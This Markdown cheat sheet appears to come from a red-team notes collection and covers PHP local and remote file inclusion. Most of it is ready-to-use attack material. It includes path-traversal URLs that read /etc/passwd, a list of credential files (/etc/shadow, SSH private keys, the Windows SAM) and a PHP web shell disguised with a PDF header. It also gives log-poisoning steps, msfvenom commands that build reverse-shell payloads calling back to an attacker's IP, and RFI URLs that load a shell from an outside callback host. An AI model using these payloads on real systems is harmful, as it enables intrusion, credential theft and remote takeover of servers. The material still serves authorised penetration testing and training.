# File Inclusion    
[PayloadAllTheThings FI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)  
## Contents 
- [File Inclusion](#file-inclusion)
  * [Contents](#contents)
  * [Local File Inclusion](#local-file-inclusion)
    + [File Upload Pages](#file-upload-pages)
    + [LFI Testing](#lfi-testing)
    + [Interesting Files](#interesting-files)
    + [LFI to RCE via PHP Filters](#lfi-to-rce-via-php-filters)
  * [Remote File Inclusion](#remote-file-inclusion)
  * [Web Payloads](#web-payloads)
    + [Testing](#testing)

## Local File Inclusion 
[Local File Inclusion](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref)   
[Guide to LFI](http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)    

Uses file inclusion to access files outside of the web root using relative or absolute file paths.      
Characters may be restricted or filtered - try URL encoding, double URL encoding, unicode / UTF-8 encoding.      
With LFI you may be able to view: config files, docs, source code, command history files, creds file, etc.          

### File Upload Pages
Bypass extension filtering: rename file to an allowed extension (ie .php to .php.pdf file)        
Bypass header check:    

    %PDF-1.4
    <?php system($_GET["cmd"]); ?>

### LFI Testing    
Check for client side scripts     
Use a [LFI wordlist](https://github.com/Karmaz95/crimson/blob/master/words/exp/LFI) to fuzz.     
More wordlists: [file inclusion Linux](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt) and [file inclusion Windows](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)     

    http://example.com/index.php?page=../../../etc/passwd  
    http://example.com/index.php?page=../../../etc/passwd%00                  #PHP below v. 5.3.4 bypass
    http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00        # double encoding    
    http://example.com/index.php?page=....//....//etc/passwd
    http://example.com/index.php?page=..///////..////..//////etc/passwd
    http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
	
    /etc/passwd, etc.
    can you include a remote file?
    ?test=php://filter/convert.base64-encode/resource=/filepath      -> base64 encode /decode  
	
    http://example.labs/page.php?file=php://filter/resource=/etc/passwd             #php filter wrapper 
	
	
Vulnerable PHP functions

    include
    require
    include_once 
    require_once 
	
### Interesting Files 
Linux 

    /etc/passwd
    /etc/shadow
    /etc/issue
    /etc/group
    /etc/hostname
    /etc/ssh/ssh_config
    /etc/ssh/sshd_config
    /root/.ssh/id_rsa
    /root/.ssh/authorized_keys
    /home/user/.ssh/authorized_keys
    /home/user/.ssh/id_rsa

Windows 

    /boot.ini
    /autoexec.bat
    /windows/system32/drivers/etc/hosts
    /windows/repair/SAM

Log Poisoning 

	open: /log/apache2/access.log 
	send payload as user agent string: <?php system($_GET['cmd']); ?>    
	/log/apache2/access.log&cmd=id      

### LFI to RCE via PHP Filters        
If you think the input is being passed to a PHP include or require function.      
[Hacktricks LFI to RCE Using PHP Filters](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters), [More Reading](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)              	
Script: [lfi2rce_via_php_filters.py](https://github.com/lw8192/Red-Team-Rising/blob/main/Web/lfi2rce_via_php_filters.py)       
If you find an LFI at http://site.php/nav.php?include=       

    python3 lfi2rce_via_php_filters.py http://site.php/nav.php -p include -c pwd            

## Remote File Inclusion 
Turning LFI to RFI: https://l.avala.mp/?p=241
[Reference](https://sushant747.gitbooks.io/total-oscp-guide/content/remote_file_inclusion.html)     
https://github.com/synacktiv/php_filter_chain_generator   

## Web Payloads 

PHP

    <?php echo shell_exec($_GET['cmd']);?> 
    <?php system($_GET['cmd']);?>
    <?php passthru($_GET['cmd']);?>   
      
      
    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
    cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

JSP

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp

WAR

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

### Testing 

    http://example.com/index.php?page=http://callback.com/shell.txt
    http://example.com/index.php?page=http://callback.com/shell.txt%00
    http://example.com/index.php?page=http:%252f%252fcallback.com%252fshell.txt
